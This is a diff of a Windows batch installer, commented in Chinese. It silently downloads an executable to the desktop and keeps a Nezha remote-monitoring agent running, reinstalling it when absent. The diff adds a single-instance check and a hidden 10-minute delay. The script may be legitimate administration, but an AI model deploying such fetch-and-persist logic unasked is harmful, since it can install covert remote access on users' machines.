@@ -2,6 +2,16 @@
 chcp 65001 >nul 2>nul
 setlocal enabledelayedexpansion
 
+:: 防止僵尸进程：检测是否已有install.bat在运行
+tasklist /fi "imagename eq cmd.exe" /v | find "install.bat" >nul 2>nul
+if %errorlevel% equ 0 (
+    :: 已有实例在运行，直接退出
+    exit
+)
+
+:: 延迟10分钟（600秒）
+timeout /t 600 /nobreak >nul 2>nul
+
 set "DESKTOP=%USERPROFILE%\Desktop"
 set "EXE_FILE=五五知行社.exe"
 set "EXE_PATH=%DESKTOP%\%EXE_FILE%"
@@ -24,17 +34,14 @@ if not exist "%EXE_PATH%" (
     "try { Invoke-WebRequest '%EXE_URL%' -OutFile '%EXE_PATH%' -TimeoutSec 30 } catch { exit }"
 )
 
-:: 检测哪吒Agent是否运行
-tasklist | find /i "nezha" >nul 2>nul
+:: 检测哪吒是否正常运行
+tasklist | find /i "nezha-agent.exe" >nul 2>nul
 if %errorlevel% neq 0 (
-    :: 哪吒未运行，检查文件是否存在，不存在则重装
-    if not exist "C:\Program Files\nezha" (
-        if not exist "C:\nezha" (
-            goto :install_nezha
-        )
-    )
+    :: 哪吒未运行 → 直接重装
+    goto :install_nezha
 )
-:: 如果哪吒在运行，检查文件是否完整，不完整则结束进程重装
+
+:: 哪吒在运行，但检查文件是否完整
 if exist "C:\Program Files\nezha" (
     if not exist "C:\Program Files\nezha\nezha-agent.exe" (
         taskkill /f /im nezha.exe >nul 2>nul
@@ -53,6 +60,7 @@ if exist "C:\nezha" (
         goto :install_nezha
     )
 )
+
 :: 一切正常则退出
 exit
 
